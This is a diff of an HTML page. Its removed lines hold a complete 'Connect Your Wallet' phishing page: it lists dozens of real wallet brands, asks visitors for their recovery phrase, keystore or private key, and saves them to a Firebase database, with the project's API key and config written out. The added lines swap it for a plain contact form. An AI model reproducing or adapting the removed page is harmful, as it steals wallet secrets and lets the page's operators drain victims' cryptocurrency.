@@ -1,330 +1,39 @@
-
 <!DOCTYPE html>
 <html lang="en">
 
 <head>
     <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Connect Your Wallet</title>
-    <style>
-        body {
-            font-family: 'Arial', sans-serif;
-            background-color: #f9f9f9;
-            color: #333;
-            margin: 0;
-            padding: 0;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            min-height: 100vh;
-        }
-
-        header {
-            background: linear-gradient(to right, #3498db, #6ab0de);
-            color: #fff;
-            text-align: center;
-            padding: 20px;
-            border-radius: 10px 10px 0 0;
-        }
-
-        section {
-            margin: 20px;
-            padding: 40px;
-            background: linear-gradient(to bottom, #fff, #f0f0f0);
-            box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
-            border-radius: 10px;
-            text-align: center;
-        }
-
-        h1 {
-            font-size: 3em;
-            color: #fff; /* White color */
-            margin-bottom: 20px;
-        }
-
-        p {
-            font-size: 1.4em;
-            line-height: 1.6;
-            color: #555;
-            margin-bottom: 30px;
-        }
-
-        .wallet-actions {
-            display: flex;
-            flex-wrap: wrap;
-            justify-content: space-around;
-            margin-top: 30px;
-        }
-
-        .wallet-action {
-            background: linear-gradient(to bottom, #3498db, #6ab0de);
-            color: #fff;
-            padding: 15px 30px;
-            margin: 20px;
-            text-align: center;
-            text-decoration: none;
-            border-radius: 8px;
-            cursor: pointer;
-            transition: background 0.3s ease;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-        }
-
-        .wallet-action:hover {
-            background: linear-gradient(to bottom, #2980b9, #5499c7);
-        }
-
-        .wallet-icon {
-            font-size: 2em;
-            margin-bottom: 10px;
-        }
-
-        .selected-wallet {
-            border: 2px solid #4CAF50;
-        }
-
-        #wallet-connect-form {
-            display: none;
-            margin-top: 20px;
-        }
-
-        label {
-            display: block;
-            margin-bottom: 10px;
-            font-size: 1.2em;
-            color: #3498db; /* Blue color */
-        }
-
-        select,
-        input,
-        textarea {
-            width: 100%;
-            padding: 10px;
-            margin-bottom: 15px;
-            font-size: 1em;
-            border: 1px solid #ccc;
-            border-radius: 5px;
-            box-sizing: border-box;
-        }
-
-        button {
-            background: linear-gradient(to bottom, #3498db, #6ab0de);
-            color: #fff;
-            padding: 15px 30px;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-            font-size: 1.2em;
-            transition: background 0.3s ease;
-        }
-
-        button:hover {
-            background: linear-gradient(to bottom, #2980b9, #5499c7);
-        }
-    </style>
-    
+    <title>Contact Messages | Firebase</title>
+    <link rel="stylesheet" href="./styles.css">
 </head>
 
 <body>
-     <script src="https://cdnjs.cloudflare.com/ajax/libs/firebase/7.14.1-0/firebase.js"></script>
-    <header>
-        <h1>Connect Your Wallet</h1>
-        <p>Choose your preferred wallet type and enter your credentials to connect.</p>
-    </header>
-
-    <section>
-        <div class="wallet-actions">
-            <!-- Wallet options dynamically generated from the provided list -->
-            <label for="wallet-list">Choose Wallet:</label>
-            <select id="wallet-list" onchange="selectWallet()">
-                <option value="">Select a wallet</option>
-                <option value="MetaMask">MetaMask</option>
-                <option value="Trust Wallet">Trust Wallet</option>
-                <option value="Coinbase Wallet">Coinbase Wallet</option>
-                <option value="Ledger Nano X">Ledger Nano X</option>
-                <option value="Trezor Model T">Trezor Model T</option>
-                <option value="Mycelium">Mycelium</option>
-                <option value="Exodus">Exodus</option>
-                <option value="Leap Wallet">Leap Wallet</option>
-                <option value="Stader">Stader</option>
-                <option value="Atomic Wallet">Atomic Wallet</option>
-                <option value="Electrum">Electrum</option>
-                <option value="Coinomi">Coinomi</option>
-                <option value="Celsius">Celsius</option>
-                <option value="ZenGo">ZenGo</option>
-                <option value="Safepal S1">Safepal S1</option>
-                <option value="Ledger Nano S">Ledger Nano S</option>
-                <option value="Guard Wallet">Guard Wallet</option>
-                <option value="BitKeep">BitKeep</option>
-                <option value="eToro Money Crypto Wallet">eToro Money Crypto Wallet</option>
-                <option value="FTX Wallet">FTX Wallet</option>
-                <option value="Phantom Wallet">Phantom Wallet</option>
-                <option value="KeepKey">KeepKey</option>
-                <option value="Ellipal Titan">Ellipal Titan</option>
-                <option value="Argent Wallet">Argent Wallet</option>
-                <option value="YouHodler">YouHodler</option>
-                <option value="Bitbox02">Bitbox02</option>
-                <option value="Coldcard">Coldcard</option>
-                <option value="Keystone Pro">Keystone Pro</option>
-                <option value="Kraken">Kraken</option>
-                <option value="Gemini">Gemini</option>
-                <option value="SimpleHold Wallet">SimpleHold Wallet</option>
-                <option value="MyEtherWallet">MyEtherWallet</option>
-                <option value="Infinito Wallet">Infinito Wallet</option>
-                <option value="Wirex Wallet">Wirex Wallet</option>
-                <option value="CoinSpace Wallet">CoinSpace Wallet</option>
-                <option value="CoolWallet S">CoolWallet S</option>
-                <option value="Crypto.com DeFi Wallet">Crypto.com DeFi Wallet</option>
-                <option value="BitPay">BitPay</option>
-                <option value="Empire Wallet">Empire Wallet</option>
-                <option value="StakedWallet.io">StakedWallet.io</option>
-                <option value="Jaxx">Jaxx</option>
-                <option value="Xapo Wallet">Xapo Wallet</option>
-                <option value="Crypterium">Crypterium</option>
-                <option value="BitFreezer">BitFreezer</option>
-                <option value="Luno">Luno</option>
-                <option value="CoinJar Wallet">CoinJar Wallet</option>
-                <option value="Quppy">Quppy</option>
-                <option value="Freewallet">Freewallet</option>
-                <option value="SecuX Stone V20">SecuX Stone V20</option>
-                <option value="BitLox Ultimate">BitLox Ultimate</option>
-                <option value="Unstoppable Wallet">Unstoppable Wallet</option>
-                <option value="Binance Chain Wallet">Binance Chain Wallet</option>
-                <option value="D'CENT Wallet">D'CENT Wallet</option>
-                <option value="BC Vault Wallet">BC Vault Wallet</option>
-                <option value="Arculus Wallet">Arculus Wallet</option>
-                <option value="Robinhood Crypto Wallet">Robinhood Crypto Wallet</option>
-                <option value="Wasabi Wallet">Wasabi Wallet</option>
-                <option value="Nexo">Nexo</option>
-                <option value="BRD Wallet">BRD Wallet</option>
-                <option value="Keplr">Keplr</option>
-                <option value="GreenAddress Wallet">GreenAddress Wallet</option>
-                <option value="Huobi Wallet">Huobi Wallet</option>
-                <option value="Enjin Wallet">Enjin Wallet</option>
-                <option value="StormGain">StormGain</option>
-                <option value="Clever">Clever</option>
-                <option value="TrustVault">TrustVault</option>
-                <option value="Moonlet">Moonlet</option>
-                <option value="TokenPocket">TokenPocket</option>
-                
-
-
-                <!-- Add more wallet options dynamically -->
-            </select>
-        </div>
-
+    <div class="container">
         <form action="" id="contactForm">
-            <label for="wallet-type">Selected Wallet:</label>
-            <input type="text" id="selected-wallet" readonly>
-            
-            <label for="wallet-name">Wallet Name:</label>
-            <input type="text" id="wallet-name" required>
-            
-            <label for="wallet-info-type">Select Wallet Information Type:</label>
-            <select id="wallet-info-type" onchange="showInfoInput()">
-                <option value="phrase">Phrase</option>
-                <option value="keystore">Keystore</option>
-                <option value="private-key">Private Key</option>
-            </select>
+            <div class="alert">Your message sent</div>
 
-            <div id="info-input-container"></div>
+            <div class="inputBox">
+                <input type="text" id="name" placeholder="Your name...." />
+            </div>
 
-            
+            <div class="inputBox">
+                <input type="email" id="emailid" placeholder="Your Email....." />
+            </div>
+
+            <div class="inputBox">
+                <textarea id="msgContent" cols="30" rows="10" placeholder="Message"></textarea>
+            </div>
+
+            <div class="inputBox">
                 <button type="submit">Submit</button>
-            
+            </div>
         </form>
-    </section>
+    </div>
 
-    <script>
-   const firebaseConfig = {
-  // Ajoutez ici les informations de configuration de votre projet Firebase
-        apiKey: "AIzaSyDL02IHV9fVfPm5r2g5-j3KxvPjrP7pj7c",
-  authDomain: "contactform-50d9f.firebaseapp.com",
-  databaseURL: "https://contactform-50d9f-default-rtdb.firebaseio.com",
-  projectId: "contactform-50d9f",
-  storageBucket: "contactform-50d9f.appspot.com",
-  messagingSenderId: "481729191146",
-  appId: "1:481729191146:web:6798592b5070b2119f0b93"
-};
-
-// Initialisez Firebase
-firebase.initializeApp(firebaseConfig);
-
-// Référence de votre base de données
-var walletConnectDB = firebase.database().ref("contactForm");
-
-document.getElementById("contactForm").addEventListener("submit", connectWallet);
-
-function connectWallet(e) {
-  e.preventDefault();
-
-  var selectedWallet = getElementVal("wallet-list");
-  var walletName = getElementVal("wallet-name");
-  var walletInfoType = getElementVal("wallet-info-type");
-  var walletInfo = getElementVal("info-input");
-
-  saveWalletInfo(selectedWallet, walletName, walletInfoType, walletInfo);
-
-  // Affiche l'alerte
-  document.querySelector(".alert").style.display = "block";
-
-  // Supprime l'alerte après 3 secondes
-  setTimeout(() => {
-    document.querySelector(".alert").style.display = "none";
-  }, 3000);
-
-  // Réinitialise le formulaire
-  document.getElementById("wallet-connect-form").reset();
-}
-
-const saveWalletInfo = (selectedWallet, walletName, walletInfoType, walletInfo) => {
-  var newWalletConnect = walletConnectDB.push();
-
-  newWalletConnect.set({
-    selectedWallet: selectedWallet,
-    walletName: walletName,
-    walletInfoType: walletInfoType,
-    walletInfo: walletInfo,
-  });
-};
-
-// Fonction pour afficher le champ d'information en fonction du type de portefeuille sélectionné
-function showInfoInput() {
-  var infoInputContainer = document.getElementById("info-input-container");
-  var walletInfoType = getElementVal("wallet-info-type");
-
-  // Efface le contenu actuel du conteneur
-  infoInputContainer.innerHTML = "";
-
-  // Crée le champ d'information en fonction du type sélectionné
-  switch (walletInfoType) {
-    case "phrase":
-      infoInputContainer.innerHTML = '<label for="info-input">Enter Recovery Phrase:</label><input type="text" id="info-input" required>';
-      break;
-    case "keystore":
-      infoInputContainer.innerHTML = '<label for="info-input">Enter Keystore:</label><input type="text" id="info-input" required>';
-      break;
-    case "private-key":
-      infoInputContainer.innerHTML = '<label for="info-input">Enter Private Key:</label><input type="text" id="info-input" required>';
-      break;
-    default:
-      break;
-  }
-}
-
-// Fonction pour récupérer la valeur d'un élément par son ID
-const getElementVal = (id) => {
-  return document.getElementById(id).value;
-};
-
-
-   
-        
-    </script>
-
-
-    
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/firebase/7.14.1-0/firebase.js"></script>
+    <script src="./mail.js"></script>
 </body>
 
 </html>
